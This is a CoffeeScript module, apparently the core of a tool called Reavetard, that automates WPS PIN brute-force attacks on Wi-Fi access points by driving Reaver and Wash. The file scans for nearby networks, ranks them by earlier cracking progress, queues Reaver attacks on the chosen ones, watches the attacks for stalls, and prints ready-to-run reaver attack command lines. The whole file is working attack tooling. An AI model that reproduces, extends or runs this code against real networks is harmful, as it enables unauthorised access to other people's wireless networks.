# Reavetard - Reaver WPS (+Wash) extension scripts
# reavetard.coffee :: Module that brings all the little pieces together to make
#   sweet, dynamic love to your reaver and wash duo
# Author: Robbie Saunders http://eibbors.com/[/p/reavetard]
# ==============================================================================

# Module dependencies
# -------------------------
rtard = require 'commander'
cli = require './cli'
db = require './db'
wash = require './wash'
{ReaverQueueManager} = require './reaver'
config = require './config'

# `Command` handlers - functions used to initiate/control reavetard
# ----------------------------------------------------------------------

# Spawns a wash survey (technically a scan, by default)
runWashScan = (iface, scan = true) =>
  stations = # Used to categorize results for later review
    complete:   []
    inProgress: []
    noHistory:  []
  rdb = new db(rtard.reaverPath ? config.REAVER_DEFAULT_PATH, rtard.rdbFile ? config.REAVER_DEFAULT_DBFILE)
  iface ?= config.DEFAULT_INTERFACE
  w = new wash(config.WASH_DEFAULT_ARGS(iface, scan))
  
  # Clean wash up in case we missed another chance to stop it
  # These processes go absolutely bonkers with your resources once there's
  # around three or more of the bastards left open. hah
  process.on 'exit', =>
    w.stop()

  # After messing around with different options, this seemed simple & intuitive enough
  cli._c.foreground(250)
  rtard.prompt ' *** Press enter to move on to next step ***', =>
    w.stop()
    process.nextTick -> reviewTargets.apply(null, [stations])

  # Handle access points found by our washing machine
  w.on 'ap', (station) ->
    rdb.checkSurvey station.bssid, (err, rows) ->
      if not err and rows.length > 0
        device =
          name: rows[0].device_name
          manufacturer: rows[0].manufacturer
          model: rows[0].model_name 
          number: rows[0].model_number
        for k,v of device
          if v isnt '' 
            station.device = device
      rdb.checkHistory station.bssid, (err, rows) ->
        if err then console.error errd
        if rows.length > 0
          # Copy history data to station object
          (station[k] ?= v) for k,v of rows[0]
          # Load session data (if available)
          station.session = rdb.loadSession station.bssid
          # If history -or- session specifies completion
          if station.attempts >= 11000 or station.session.phase is 2
            stations.complete.push station
            station.category = 'C'
          else 
            stations.inProgress.push station
            station.category = 'W'
        else
          stations.noHistory.push station
          station.category = 'N'
        cli.washHit station, station.category

  # Hopefully you won't be seeing any of these!
  w.on 'error', ->
    console.error "ERROR: #{arguments}"

  # Let the mayhem begin
  w.start()
  cli.cwrite('magenta', ' Wash scan has been started, now waiting for AP data...\n\n')

# Function called when running the rdbq command. It pulls -every- available
# row out of the history/survey tables and any associated session files.
runRDBQuery = () =>
  stations = # Used to categorize results for later review
    complete:   []
    inProgress: []
    noHistory:  []
  rdb = new db(rtard.reaverPath ? config.REAVER_DEFAULT_PATH, rtard.rdbFile ? config.REAVER_DEFAULT_DBFILE)

  rdb.getHistory (err, history) ->
    if err then throw err
    rdb.getSurvey (err, survey) ->
      if err then throw err
      joined = {}
      # Start by indexing the history data by bssid in new object, joined
      for row in history
        joined[row.bssid] = row
      # Merge the survey data with history data or index the new station
      for row in survey
        joined[row.bssid] ?= {}
        (joined[row.bssid][k] = v) for k,v of row
        joined[row.bssid].locked = joined[row.bssid].locked is 1
      # Finally, load session data, categorize the station, and print confirmation
      for bssid, station of joined
        station.session = rdb.loadSession(bssid)
        if station.attempts?
          if station.attempts is 11000 or station.session?.phase is 2
            stations.complete.push station
            station.category = 'C'
          else 
            stations.inProgress.push station
            station.category = 'W'
        else
          stations.noHistory.push station
          station.category = 'N'
        cli.washHit station, station.category, true
      rtard.prompt '\n (Press enter to continue to target review)', ->
        process.nextTick -> reviewTargets.apply(null, [stations])


# Present ansi-formatted tables containing scan/query results, from which user can select from
reviewTargets = (stations, reprompt=false) ->
  if not reprompt 
    cli.clear()
    indexed = cli.targetReviewTable stations
    cli.reviewSelectors()
    cli._c.foreground(255)
  else 
    console.log ' Your input did not include any valid selections, please try again...'
  rtard.prompt ' Please enter the #/selector for each target that you wish to select: ', (input) =>
    cli._c.down(1).erase('line')
    selections = input.match(/-?\d+/g)
    selected = []
    for station in indexed
      if '0' in selections or "#{station.tableIndex}" in selections 
        selected.push station
      else
        switch station.category
          when 'C'
            if '-1' in selections then selected.push station
          when 'W'
            if '-2' in selections then selected.push station
          when 'N'          
            if '-3' in selections then selected.push station
    cli.clear().title(true).cwrite(250, " You have selected the following #{selected.length} station(s): \n ")
    isfirst = true
    for sel in selected
      if not isfirst then cli.cwrite(250, ', ') 
      else isfirst = false
      cli.cwrite(cli.STATION_COLORS[sel.category ? 'N'], "#{sel.essid}")
    cli.cdwrite('bright', 'blue', '\n\n What would you like reavetard to do with these station(s)?\n')
       .cdwrite('reset',     245,   ' -----------------------------------------------------------------------\n').targetActions()
    cli._c.foreground('blue')
    actionPrompt(selected)

# Prompt user for desired action, given a list of targets, and perform
# action or defer it to another function
actionPrompt = (selected) =>
  rtard.prompt '\n Please enter one of the letters in ()\'s, or entire title, of your desired action: ', (choice) =>
    switch choice
      when 'a', 'attack'
        process.nextTick -> startAttack.apply(null, [selected]) 
      when 'j', 'json' # Output station data in JSON (useful when scripting reavetard yourself)
        cli.cwrite 250, ' Would you like to include the session file key data?\n'
        cli.cwrite 'yellow', ' Doing so can add 11k partial pins for every station with session data!\n'
        cli._c.foreground 250
        rtard.confirm " What'll it be, champ? (y)ay or (n)ay: ", (showPins) ->
          if not showPins
            for s in selected when s.session?
              s.session.Pins = 'removed'
          console.log JSON.stringify selected
          process.exit()
      when 'u', 'usage'
        for s in selected
          config.REAVER_DEFAULT_ARGS
          console.log "reaver -i mon0 -b #{s.bssid} #{if s.channel then '-c ' + s.channel} -vv -a -N -S"
        process.exit()
      when 'x', 'exit'
        console.log 'goodbye.'
        process.exit()
      else
        console.log 'You didn\'t enter one of the available letters/words. Try again.\n'
        process.nextTick -> actionPrompt selected

startAttack = (selected) ->
  atkQueue = new ReaverQueueManager(selected, rtard.interface)
  atkQueue.on 'stopped', (reason) =>
    if reason is 'paused'
      rtard.prompt ' *** Reavetard is paused, press enter to resume ***', ->
        process.nextTick atkQueue.start
    else if reason isnt 'killed'
      if atkQueue.priority?.length? >= 1 or atkQueue.secondary?.length? >= 1
        process.nextTick atkQueue.start
      else
        attackReview atkQueue.finished
  attackPrompt = =>
    cli._c.display('hidden')
    rtard.prompt ': ', (cmd) ->
      switch cmd
        when 'h', 'help'
          cli.attackCommands()
        when 'n', 'next'
          atkQueue.stop('skipped')
        when 'p', 'pause'
          atkQueue.stop('paused')
        when 'x', 'exit'
          atkQueue.stop('killed')
          process.exit()
        else
      process.nextTick attackPrompt
    cli._c.display('reset').attackPrompt
  atkQueue.start()
  process.on 'exit', =>
    atkQueue.stop('killed')
  pinterval = setInterval (=> 
    if atkQueue.reaver? and atkQueue.active?
      if atkQueue.prevHealth? 
        [pact, pstat, pmets] = atkQueue.prevHealth
        if pact.bssid is atkQueue.active.bssid 
          if not pstat.associated and not atkQueue.reaver.status.associated then atkQueue.stop('idle')
          if pmets.totalChecked is atkQueue.reaver.metrics.totalChecked then atkQueue.stop('idle')
      # store a snapshot of the current attack queue for next time around
      atkQueue.prevHealth = [ atkQueue.active, atkQueue.reaver.status, atkQueue.reaver.metrics ]
    else if atkQueue.priority.length is 0 and atkQueue.secondary.length is 0
      attackReview atkQueue.finished
      clearInterval()),  config.HEALTH_CHECK_INTERVAL

# For now just prints out the JSON.stringified array of stations
attackReview = (fin) ->
  for s in fin
    if s.session? then s.session.Pins = 'removed'
    if s.success then cli.cwrite 'green', JSON.stringify(s)    
    else cli.cwrite 'red', JSON.stringify(s)
  process.exit()

# Commander.js stuff to support CLI commands & parse options
# ----------------------------------------------------------------------

parseOptions = (args) ->

  rtard # Universal configuration / options
    .version('0.1.0')
    .option('-i, --interface <iface>', "Choose WLAN interface [#{config.DEFAULT_INTERFACE}]", config.DEFAULT_INTERFACE)
    .option('-r, --reaver-path <path>', "Set path to your reaver.db and session files [#{config.REAVER_DEFAULT_PATH}]", config.REAVER_DEFAULT_PATH)
    .option('-d, --rdb-file <filename>', "Set the filename of your reaver database [#{config.REAVER_DEFAULT_DBFILE}]",  config.REAVER_DEFAULT_DBFILE)
    .option('-D, --no-rdb-access', 'Do not attempt to access reaver\'s database')

  rtard # Comman" definition for `scan`
    .command('scan [silent]')
    .description('Spawn a new wash process to generate a list of nearby targets')
    .action (silent=false) ->
      cli.clear().title().cwrite('blue', ' Scan command chosen. Initializing wash survey...\n')
      if silent
        cli.cwrite 170, ' SILENT MODE ENABLED - Will not send probes to access points\n'
        scan = false
      else scan = true
      process.nextTick ->
        runWashScan(rtard.interface ? undefined, scan)

  rtard # Command definition for `rdbq` (reaver database query)
    .command('rdbq')
    .description('Pull all past targets from database and/or session files')
    .action ->
      if not rtard.rdbAccess then throw('Cannot query a database without accessing it! Try removing -D option')
      cli.clear().title().cwrite('blue', ' Reaver DB Query command chosen, Initializing query... \n\n')
      process.nextTick runRDBQuery

  rtard # Command definition for `crack`
    .command('attack <bssid1,b2,b3...>')   
    .description('Initiate reaver cracking session on one or more targets')
    .action (bssids) ->
      cli.clear().title().cwrite('blue', ' Attack command chosen. The following BSSIDs were provided: \n')
      stations = { bssid } for bssid in bssids.split(',')
      if not Array.isArray stations then stations = [stations]
      cli.cwrite(250, " #{JSON.stringify(stations)}\n").cwrite('magenta', " Initializing new attack queue on #{rtard.interface}...\n")
      process.nextTick ->
        startAttack(stations)

  # execute user's custom setup function before parsing arguments:
  if typeof config.CUSTOM_SETUP is 'function'
    config.CUSTOM_SETUP (okay, err) ->
      if okay then rtard.parse args
      else throw err
  else
    # assume user does not want to run extra setup procedure and parse args
    rtard.parse args

# If this is the main module, then parse options, otherwise export commands
if module is require.main then parseOptions(process.argv)
else module.exports = { parseOptions, startAttack, reviewTargets, runRDBQuery, runWashScan }